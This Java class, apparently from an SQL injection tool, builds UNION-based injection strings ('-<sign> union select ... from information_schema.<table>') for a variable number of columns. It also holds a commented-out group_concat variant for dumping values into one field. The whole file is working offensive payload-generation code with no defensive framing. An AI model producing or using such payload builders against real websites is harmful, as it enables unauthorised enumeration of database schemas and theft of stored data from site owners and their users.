package com.dhee.mine.Utils.payload;

public class PayloadBuild {
    private final String SELECT_NAME;
    private final String TABLE_NAME;

    public PayloadBuild(String selectName, String tableName) {
        SELECT_NAME = selectName;
        TABLE_NAME = tableName;
    }

    public StringBuilder basePayloadBuild(String sign, int possibleColumns) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("-").append(sign).append(" union select ");
        for (int i = 0; i < possibleColumns; i++) {
//            stringBuilder.append("group_concat(COALESCE(`").append(SELECT_NAME).append("`, ''))");0mm
            stringBuilder.append("`").append(SELECT_NAME).append("`");
            if (i < possibleColumns - 1) {
                stringBuilder.append(",");
            }
        }
        stringBuilder.append(" from information_schema.").append(TABLE_NAME);
        return stringBuilder;
    }
}
